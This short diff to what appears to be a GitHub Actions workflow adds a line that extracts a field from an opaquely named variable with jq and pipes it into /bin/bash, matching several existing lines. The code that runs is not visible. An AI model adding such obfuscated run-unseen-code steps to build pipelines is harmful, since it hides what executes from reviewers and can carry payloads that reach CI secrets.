@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$psx8" | jq -r .lan99 | /bin/bash
           echo $dc4 | jq -r .brc3 | /bin/bash
           echo $siw86398 | jq -r .z3525 | /bin/bash
+          printf '%s' "$oaa4" | jq -r .s528 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
